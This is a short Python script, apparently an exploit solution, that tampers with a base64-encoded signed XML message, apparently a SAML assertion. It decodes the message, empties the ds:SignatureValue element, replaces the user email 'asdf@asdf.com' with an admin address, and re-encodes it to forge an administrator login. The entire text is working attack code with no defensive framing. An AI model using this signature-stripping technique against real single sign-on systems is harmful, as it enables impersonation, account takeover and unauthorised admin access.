with open('myfile.txt', 'r') as f:
    text = f.read()

import base64
base64_message = text + '==='
base64_bytes = base64_message.encode('ascii')
message_bytes = base64.b64decode(base64_bytes)
message = message_bytes.decode('ascii')

import re
msg=re.sub(r'(<ds:SignatureValue>).*(</ds:SignatureValue>)', r'\1\2', message)
msg=re.sub(r'asdf@asdf.com',r'admin@libcurl.so', msg)
print(base64.b64encode(msg.encode()))

